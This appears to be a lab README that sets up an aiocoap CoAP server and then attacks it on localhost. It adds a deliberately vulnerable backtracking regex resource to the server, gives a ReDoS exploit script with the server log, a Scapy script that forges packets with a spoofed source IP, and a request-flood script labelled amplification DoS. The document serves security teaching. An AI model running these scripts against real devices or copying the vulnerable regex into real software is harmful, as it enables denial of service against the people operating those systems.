# Constrained Application Protocol (CoAP) 

## Installation
To install a CoAP (Constrained Application Protocol) server with logging enabled, Here are general steps for setting up a CoAP server using a popular library in Python called aiocoap, which is an asynchronous CoAP framework:
source: https://git.fslab.de/jkonra2m/aiocoapMC
### Prerequisites
+ Python 3.7 or higher
+ pip (Python package installer)
+ It imports the necessary modules from Python's asyncio library for asynchronous programming and various components from the aiocoap library.

## CoAP Server Installation
https://github.com/chrysn/aiocoap/blob/master/server.py

aiocoap is published under the MIT License, and follows the best practice of reuse.software.
aiocoap was originally based on txThings by Maciej Wasilak. The full list of aiocoap contributors can be obtained from the version control history.

### Output
```bash
INFO:websockets.server:server listening on [::]:8683
INFO:websockets.server:server listening on 0.0.0.0:8683
DEBUG:coap-server:Server ready to receive requests
```
# Attacks
For the Constrained Application Protocol (CoAP), various types of attacks are identified, as detailed in the provided document. Here's a list of attacks on the CoAP protocol:

1. **Regular Expression Denial of Service (ReDoS)**: This attack exploits inefficiencies in regular expression processing algorithms to create service denials. Implement a regex in the CoAP resource that is known for causing performance issues when given specially crafted inputs, such as (a+)+$.
[hier](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS) can find more information about this attack in details.
Depending on what your CoAP resource processes, payloads or URI paths that exploit the regex vulnerability. For instance, if the CoAP server uses a regex to validate query parameters, your malicious input would be included as a query parameter in the CoAP request.
## Change in server.py
new resource called RegexResource and library added to the server.
This resource and liberary 're' uses a vulnerable regex to parse the input.
```python
import re

class RegexResource(resource.Resource):
    
    async def render_get(self, request):

        pattern = r"^(a+)+$"
        input_string = request.payload.decode('utf-8')
        
        if re.match(pattern, input_string):
            return aiocoap.Message(content_format=ContentFormat.TEXT, payload=b"Matched")
        else:
            return aiocoap.Message(content_format=ContentFormat.TEXT, payload=b"Not Matched")

# Add this resource to the server
root.add_resource(['vulnerable'], RegexResource())
```
## Exploit
```python
async def main():
    context = await Context.create_client_context()

    payload = b"a" * 50000  # Long sequence of 'a's
    request = Message(code=GET, payload=payload, uri="coap://localhost/vulnerable")

    response = await context.request(request).response

    print('Result: %s\n%r' % (response.code, response.payload))

if __name__ == "__main__":
    asyncio.run(main())
```
## Func
This Exploit sends a very long string of 'a's to the server, which, due to the regex (a+)+$, causes catastrophic backtracking, potentially freezing or significantly slowing down the server. This illustrates a basic ReDoS attack scenario.
## Output
```bash
INFO:websockets.server:server listening on 0.0.0.0:8683
INFO:websockets.server:server listening on [::]:8683
DEBUG:coap-server:Server ready to receive requests
DEBUG:coap-server:Incoming message <aiocoap.Message at 0x7fd47051d850: CON GET (MID 16783, token 5bde) remote <UDP6EndpointAddress [::1]:54173 (locally ::1%lo)>, 3 option(s), 1024 byte(s) payload>
DEBUG:coap-server:New unique message received
INFO:coap-server:Render request raised a renderable error (ContinueException(BlockwiseTuple(block_number=0, more=True, size_exponent=6))), responding accordingly.
DEBUG:coap-server:Sending message <aiocoap.Message at 0x7fd470554110: ACK 2.31 Continue (MID 16783, token 5bde) remote <UDP6EndpointAddress [::1]:54173 (locally ::1%lo)>, 1 option(s)>
DEBUG:coap-server:Incoming message <aiocoap.Message at 0x7fd470537f90: CON GET (MID 16784, token 5bdf) remote <UDP6EndpointAddress [::1]:54173 (locally ::1%lo)>, 3 option(s), 1024 byte(s) payload>
DEBUG:coap-server:New unique message received
INFO:coap-server:Render request raised a renderable error (ContinueException(BlockwiseTuple(block_number=1, more=True, size_exponent=6))), responding accordingly.
DEBUG:coap-server:Sending message <aiocoap.Message at 0x7fd470554b10: ACK 2.31 Continue (MID 16784, token 5bdf) remote <UDP6EndpointAddress [::1]:54173 (locally ::1%lo)>, 1 option(s)>
DEBUG:coap-server:Incoming message <aiocoap.Message at 0x7fd470554a50: CON GET (MID 16785, token 5be0) remote <UDP6EndpointAddress [::1]:54173 (locally ::1%lo)>, 3 option(s), 1024 byte(s) payload>
DEBUG:coap-server:New unique message received
INFO:coap-server:Render request raised a renderable error (ContinueException(BlockwiseTuple(block_number=2, more=True, size_exponent=6))), responding accordingly.
DEBUG:coap-server:Sending message <aiocoap.Message at 0x7fd470555610: ACK 2.31 Continue (MID 16785, token 5be0) remote <UDP6EndpointAddress [::1]:54173 (locally ::1%lo)>, 1 option(s)>
DEBUG:coap-server:Incoming message <aiocoap.Message at 0x7fd470555550: CON GET (MID 16786, token 5be1) remote <UDP6EndpointAddress [::1]:54173 (locally ::1%lo)>, 3 option(s), 1024 byte(s) payload>
DEBUG:coap-server:New unique message received
INFO:coap-server:Render request raised a renderable error (ContinueException(BlockwiseTuple(block_number=3, more=True, size_exponent=6))), responding accordingly.
DEBUG:coap-server:Sending message <aiocoap.Message at 0x7fd4705560d0: ACK 2.31 Continue (MID 16786, token 5be1) remote <UDP6EndpointAddress [::1]:54173 (locally ::1%lo)>, 1 option(s)>
DEBUG:coap-server:Incoming message <aiocoap.Message at 0x7fd470556010: CON GET (MID 16787, token 5be2) remote <UDP6EndpointAddress [::1]:54173 (locally ::1%lo)>, 3 option(s), 1024 byte(s) payload>
.
.
block_number 4 until 46
.
.
DEBUG:coap-server:New unique message received
INFO:coap-server:Render request raised a renderable error (ContinueException(BlockwiseTuple(block_number=47, more=True, size_exponent=6))), responding accordingly.
DEBUG:coap-server:Sending message <aiocoap.Message at 0x7fd470577c90: ACK 2.31 Continue (MID 16830, token 5c0d) remote <UDP6EndpointAddress [::1]:54173 (locally ::1%lo)>, 1 option(s)>
DEBUG:coap-server:Incoming message <aiocoap.Message at 0x7fd470577bd0: CON GET (MID 16831, token 5c0e) remote <UDP6EndpointAddress [::1]:54173 (locally ::1%lo)>, 3 option(s), 848 byte(s) payload>
DEBUG:coap-server:New unique message received
DEBUG:coap-server:Sending message <aiocoap.Message at 0x7fd47057c710: ACK 2.05 Content (MID 16831, token 5c0e) remote <UDP6EndpointAddress [::1]:54173 (locally ::1%lo)>, 2 option(s), 7 byte(s) payload>

```
2. **IP Address Spoofing**: [Exploiting the remote server access support of CoAP protocol]
This involves altering the sending IP address within UDP packets to impersonate another device or service.
With Scapy, we can simply craft packets and send them. So, if we spoof the source address and send it, the network accepts and returns the response to the spoofed address. Now, we can create a script to ping a system with a spoofed IP [Python Penetration Testing Cookbook]. 
Scapy is a powerful interactive packet manipulation library written in Python. Scapy is able to forge or decode packets of a wide number of protocols, send them on the wire, capture them, match requests and replies, and much more.[https://scapy.net/]
## Exploit
```python
from scapy.all import *
from scapy.layers.inet import IP, UDP
from scapy.contrib.coap import *

def send_spoofed_packet(target_ip, spoofed_ip, target_port=5683):
    coap_layer = CoAP(type=1, code=1)
    udp_layer = UDP(sport=RandShort(), dport=target_port)
    ip_layer = IP(src=spoofed_ip, dst=target_ip)

    packet = ip_layer / udp_layer / coap_layer
    send(packet)

target_ip = '127.0.0.1'  # Target aiocoap server IP
spoofed_ip = '127.0.0.1'  # Spoofed source IP

send_spoofed_packet(target_ip, spoofed_ip)

```   
3. **Replay Attacks**: This type of attack captures legitimate messages and resends them to perform unauthorized operations.
    source: https://www.ietf.org/archive/id/draft-ietf-core-attacks-on-coap-04.html
4. **Relay Attacks**: These attacks involve capturing and retransmitting messages in real-time, which can be used to bypass authentication mechanisms.
   
5. **Injection Attacks**: These occur by intercepting a TCP communication to inject malicious TCP segments into legitimate packets, carrying modified CoAP messages that interfere with server operations.
   
6. **CoAP Amplification DoS Attack**: Attackers send multiple CoAP GET requests to create large responses from small requests, thereby straining network resources and amplifying traffic.

## Exploit
```python
import asyncio
from aiocoap import *

async def main():
    context = await Context.create_client_context()
    for _ in range(100):
        request = Message(code=GET, uri="coap://127.0.0.1/amplifiable_resource")
        try:
            response = await context.request(request).response
            print('Result: %s\n%r' % (response.code, response.payload))
        except Exception as e:
            print('Failed to fetch resource:')
            print(e)
        await asyncio.sleep(1)

if __name__ == "__main__":
    asyncio.get_event_loop().run_until_complete(main())
```
## Func

## Output
```bash
DEBUG:coap-server:Incoming message <aiocoap.Message at 0x7f7062c34310: CON GET (MID 50232, token 3847) remote <UDP6EndpointAddress [::1]:37270 (locally ::1%lo)>, 2 option(s)>
DEBUG:coap-server:New unique message received
DEBUG:coap-server:Sending message <aiocoap.Message at 0x7f7062c60110: ACK 2.05 Content (MID 50232, token 3847) remote <UDP6EndpointAddress [::1]:37270 (locally ::1%lo)>, 1 option(s), 202 byte(s) payload>
DEBUG:coap-server:Incoming message <aiocoap.Message at 0x7f7062c37ed0: CON GET (MID 50233, token 3848) remote <UDP6EndpointAddress [::1]:37270 (locally ::1%lo)>, 2 option(s)>
DEBUG:coap-server:New unique message received
DEBUG:coap-server:Sending message <aiocoap.Message at 0x7f7062c61050: ACK 2.05 Content (MID 50233, token 3848) remote <UDP6EndpointAddress [::1]:37270 (locally ::1%lo)>, 1 option(s), 202 byte(s) payload>
DEBUG:coap-server:Incoming message <aiocoap.Message at 0x7f7062c60950: CON GET (MID 50234, token 3849) remote <UDP6EndpointAddress [::1]:37270 (locally ::1%lo)>, 2 option(s)>
DEBUG:coap-server:New unique message received
... too many
```
7. **Reflective Denial of Service (DoS)**: Employing legitimate requests to third-party servers that are then amplified and reflected back to the victim .

These attacks exploit various aspects of the CoAP protocol and its implementations, highlighting the importance of robust security measures to mitigate these threats.